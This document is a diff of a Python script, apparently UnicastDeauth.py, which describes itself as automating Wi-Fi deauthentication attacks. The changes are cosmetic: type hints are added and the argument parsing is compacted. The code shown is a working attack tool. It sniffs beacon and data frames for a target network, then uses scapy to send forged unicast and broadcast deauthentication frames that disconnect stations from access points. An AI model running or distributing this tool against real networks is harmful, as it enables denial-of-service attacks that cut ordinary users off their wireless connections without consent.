@@ -21,19 +21,19 @@ BROADCAST = 'ff:ff:ff:ff:ff:ff'
 DEAUTH_COUNT = 64
 
 class MsgException(Exception):
-    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
+    def __init__(self, exception: Exception, message: str = 'Unknown error', *args, **kwargs) -> None:
         super().__init__(*args, **kwargs)
         self._exception = exception
         self._message = message
     
-    def __str__(self):
+    def __str__(self) -> str:
         return f'[!] Error! {self._message}:\n    {self._exception}'
 
 class AccessPoints:
     
     _bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
     
-    def __init__(self, essid, bssids = None):
+    def __init__(self, essid: str, bssids: str = None) -> None:
         self._essid = essid
         self._bssids = set()
         if bssids:
@@ -42,13 +42,13 @@ class AccessPoints:
                 if self._bssid_regex.match(bssid):
                     self._bssids.add(bssid)
     
-    def __contains__(self, bssid):
+    def __contains__(self, bssid: str) -> bool:
         return bssid in self._bssids
     
-    def get_essid(self):
+    def get_essid(self) -> str:
       return self._essid
     
-    def add(self, bssid):
+    def add(self, bssid: str) -> None:
         self._bssids.add(bssid)
         print_info(
             f'AP detected for network {self._essid}'
@@ -56,14 +56,14 @@ class AccessPoints:
         )
 
 class Stations:
-    def __init__(self, essid):
+    def __init__(self, essid: str) -> None:
         self._essid = essid
         self._bssids = {} # {bssid_sta: bssid_ap}
     
-    def get(self, bssid_sta):
+    def get(self, bssid_sta: str) -> str | None:
         return self._bssids.get(bssid_sta)
     
-    def update(self, bssid_sta, bssid_ap):
+    def update(self, bssid_sta: str, bssid_ap: str) -> None:
         self._bssids.update({bssid_sta: bssid_ap})
         print_info(
             f'STA detected for network {self._essid}'
@@ -71,17 +71,17 @@ class Stations:
             f'\n    access point = {bssid_ap}'
         )
 
-def panic(msg_exception):
+def panic(msg_exception: MsgException) -> None:
     '''exception handling'''
     
     print(msg_exception, file = sys.stderr)
 
-def print_info(message):
+def print_info(message: str) -> None:
     '''additional info printing'''
     
     print(f'[!] Info: {message}', file = sys.stderr)
 
-def is_unicast(bssid):
+def is_unicast(bssid: str) -> bool:
     '''bssid type checking'''
     
     try:
@@ -90,7 +90,7 @@ def is_unicast(bssid):
         raise MsgException(e, 'BSSID could not be processed')
     return unicast
 
-def get_src_dst_network(frame):
+def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str | None]:
     '''frame control field parsing'''
     
     try:
@@ -113,25 +113,25 @@ def get_src_dst_network(frame):
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
-def unicast_deauth(wifi_interface, deauth_rounds, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth(wifi_interface: str, deauth_rounds: int, bssid_sta: str, bssid_ap: str, bssid_network: str) -> None:
     '''unicast deauthentication'''
     
     try:
-        def unicast_deauth_parallel():
+        def unicast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
             for i in range(deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7),
+                        dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+                        dot11.Dot11Deauth(reason = 7),
                     iface = wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7),
+                        dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+                        dot11.Dot11Deauth(reason = 7),
                     iface = wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
@@ -142,17 +142,17 @@ def unicast_deauth(wifi_interface, deauth_rounds, bssid_sta, bssid_ap, bssid_net
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def broadcast_deauth(wifi_interface, deauth_rounds, bssid_ap, bssid_network):
+def broadcast_deauth(wifi_interface: str, deauth_rounds: int, bssid_ap: str, bssid_network: str) -> None:
     '''broadcast deauthentication'''
     
     try:
-        def broadcast_deauth_parallel():
+        def broadcast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
             for i in range(deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7),
+                        dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+                        dot11.Dot11Deauth(reason = 7),
                     iface = wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
@@ -162,8 +162,9 @@ def broadcast_deauth(wifi_interface, deauth_rounds, bssid_ap, bssid_network):
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, broadcast_enabled, deauth_rounds, aps_targetlist, aps_whitelist, stations):
-    def sniffer_handler(frame):
+def sniffer_wrapper(wifi_interface: str, broadcast_enabled: bool, deauth_rounds: int, aps_targetlist: AccessPoints,
+                    aps_whitelist: AccessPoints, stations: Stations) -> None:
+    def sniffer_handler(frame: dot11.Dot11) -> None:
         '''sniffed frame processing'''
         
         try:
@@ -209,11 +210,12 @@ def sniffer_wrapper(wifi_interface, broadcast_enabled, deauth_rounds, aps_target
             raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
 
-def main():
+def main() -> None:
     '''main'''
     
     try:
         examples = [
+            'examples:',
             'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
             'UnicastDeauth.py -i wlan0 -e NETGEAR -n 8',
             'UnicastDeauth.py -i wlan0 -e NETGEAR -tl 00:11:22:33:44:00,00:11:22:33:44:55',
@@ -222,47 +224,14 @@ def main():
         parser = argparse.ArgumentParser(
             description = 'UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks',
             formatter_class = argparse.RawTextHelpFormatter,
-            epilog = 'examples:\n  ' + '\n  '.join(examples),
+            epilog = '\n  '.join(examples),
         )
-        parser.add_argument(
-            '-i',
-            dest = 'wifi_interface',
-            help = 'attacker Wi-Fi interface',
-            required = True,
-        )
-        parser.add_argument(
-            '-e',
-            dest = 'essid',
-            help = 'target ESSID',
-            required = True,
-        )
-        parser.add_argument(
-            '-b',
-            dest = 'broadcast_enabled',
-            help = 'enable broadcast deauthentication',
-            required = False,
-            action = 'store_true',
-        )
-        parser.add_argument(
-            '-n',
-            dest = 'deauth_rounds',
-            help = 'number of deauthentication rounds',
-            required = False,
-            type = int,
-            default = 1,
-        )
-        parser.add_argument(
-            '-tl',
-            dest = 'aps_targetlist',
-            help = 'comma-separated known target APs',
-            required = False,
-        )
-        parser.add_argument(
-            '-wl',
-            dest = 'aps_whitelist',
-            help = 'comma-separated APs whitelist',
-            required = False,
-        )
+        parser.add_argument('-i', dest = 'wifi_interface', help = 'attacker Wi-Fi interface', required = True)
+        parser.add_argument('-e', dest = 'essid', help = 'target ESSID', required = True)
+        parser.add_argument('-b', dest = 'broadcast_enabled', help = 'enable broadcast deauthentication', action = 'store_true')
+        parser.add_argument('-n', dest = 'deauth_rounds', help = 'number of deauthentication rounds', type = int, default = 1)
+        parser.add_argument('-tl', dest = 'aps_targetlist', help = 'comma-separated known target APs')
+        parser.add_argument('-wl', dest = 'aps_whitelist', help = 'comma-separated APs whitelist')
         args = parser.parse_args()
         filters = [
             'wlan type mgt subtype beacon',
@@ -277,14 +246,7 @@ def main():
         sendrecv.sniff(
             iface = args.wifi_interface,
             filter = ' or '.join(filters),
-            prn = sniffer_wrapper(
-                args.wifi_interface,
-                args.broadcast_enabled,
-                args.deauth_rounds,
-                aps_targetlist,
-                aps_whitelist,
-                stations,
-            ),
+            prn = sniffer_wrapper(args.wifi_interface, args.broadcast_enabled, args.deauth_rounds, aps_targetlist, aps_whitelist, stations),
         )
     except MsgException as msg_exception:
         panic(msg_exception)
